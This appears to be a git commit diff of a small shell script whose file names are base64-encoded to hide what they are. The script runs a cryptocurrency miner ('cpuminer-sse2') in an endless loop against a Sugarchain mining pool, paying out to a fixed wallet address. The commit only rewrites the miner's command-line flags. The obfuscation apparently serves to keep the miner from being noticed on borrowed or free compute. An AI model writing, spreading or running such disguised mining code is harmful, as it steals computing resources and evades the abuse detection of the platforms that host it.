37b500f678a3989a7f56964446146eb1ce5b90c6
MujurID <mujurid@students.undip.ac.id>
2021-04-02 16:20:25 +0700

    Update bGl2ZQ.sh

--- bGl2ZQ.sh
+++ bGl2ZQ.sh
@@ -2,5 +2,5 @@
 
 while [ 1 ]; do
 chmod +x Y3B1bWluZXItc3NlMg
-./Y3B1bWluZXItc3NlMg -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
+./Y3B1bWluZXItc3NlMg --algo=yespowerSUGAR --url=stratum+tcps://stratum-na.rplant.xyz:17042 --user=sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.mujurid$(( $RANDOM % 99 + 1 ))
 done
